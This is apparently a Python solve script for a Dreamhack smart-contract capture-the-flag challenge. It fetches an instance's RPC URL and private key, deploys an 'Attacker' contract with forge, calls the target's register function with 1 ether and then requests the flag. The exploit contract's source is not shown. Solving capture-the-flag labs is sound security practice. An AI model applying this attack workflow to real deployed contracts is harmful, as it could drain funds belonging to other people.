from solcx import compile_source
from eth_utils import keccak
from web3 import Web3
import os
import re
import subprocess
import requests
import json

# 문제에서 사용하는 각종 정보 추출
MAIN_URL = "http://host3.dreamhack.games:16717"
FILE_NM = "./token_info"

with open(FILE_NM, "r") as f:
    TOKEN_URL = f.read()

START_URL = f"{MAIN_URL}/start"

if (TOKEN_URL == ""):
    try:
        resp = requests.get(START_URL)

        JSON_OBJECT = json.loads(resp.text)

        TOKEN_URL = JSON_OBJECT['message'].split('/')[1]
        
        with open(FILE_NM, "w") as f:
            f.write(TOKEN_URL)
    except:
        with open(FILE_NM, "w") as f:
            pass
        exit(0)

INFO_URL = f"{MAIN_URL}/{TOKEN_URL}/info"
FLAG_URL = f"{MAIN_URL}/{TOKEN_URL}/flag"
RPC_URL = f"{MAIN_URL}/{TOKEN_URL}/rpc"

print(f"INFO URL : {INFO_URL}")
print(f"FLAG URL : {FLAG_URL}")
print(f"RPC URL : {RPC_URL}")

resp = requests.get(INFO_URL)

JSON_OBJECT = json.loads(resp.text)

CONTRACT_ADDRESS = JSON_OBJECT["message"]["level_contract_address"]
USER_PRIV_KEY = JSON_OBJECT["message"]["user_private_key"]
USER_ADDRESS = JSON_OBJECT["message"]["user_address"]

print(f"Contract Address : {CONTRACT_ADDRESS}")
print(f"User private key : {USER_PRIV_KEY}")
print(f"User address : {USER_ADDRESS}")

with open("./boko-chal/src/Attacker.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

with open("./deploy/Contract.sol", "r") as f:
    CONTRACT_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_ABI = contract_interface['abi']

COMPILED_SOL = compile_source(CONTRACT_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

contract_id, contract_interface = COMPILED_SOL.popitem()

CONTRACT_ABI = contract_interface['abi']

print(CONTRACT_ABI)

web3 = Web3(Web3.HTTPProvider(RPC_URL))

current_file = os.path.abspath(__file__)

BASE_DIR = os.path.dirname(current_file) + "/boko-chal"
CONTRACT_PATH = "/src/Attacker.sol"

command = [
    "forge", "create",
    "--rpc-url", RPC_URL,
    "--private-key", USER_PRIV_KEY,
    BASE_DIR + CONTRACT_PATH + ":Attacker",
    "--broadcast",
    "--constructor-args",
    CONTRACT_ADDRESS
]

try:
    result = subprocess.run(command, check=True, text=True, capture_output=True)
    print("CONTRACT DEPLOY SUCCESS!")
    
    attacker_address_match = re.search(r"Deployed to: (0x[a-fA-F0-9]{40})", result.stdout)

    ATTACKER_ADDRESS = attacker_address_match.group(1) if attacker_address_match else "Not found..."
    
except subprocess.CalledProcessError as e:
    print("CONTRACT DEPLOY FAILED...")
    print(e.stderr)

if (ATTACKER_ADDRESS == "Not found..."):
    print("ATTACKER ADDRESS NOT FOUND...")
    exit(0)

print(f"Attacker Address : {ATTACKER_ADDRESS}\n")

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

print("---- DO ATTACK ----")

tx = contract.functions.register(ATTACKER_ADDRESS).build_transaction({
    "from": USER_ADDRESS,
    "value": web3.to_wei(1, "ether"),
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

print("---- GET FLAG ----")
resp = requests.get(FLAG_URL)

result = contract.functions.getResult().call()

print(result)

print(resp.text)
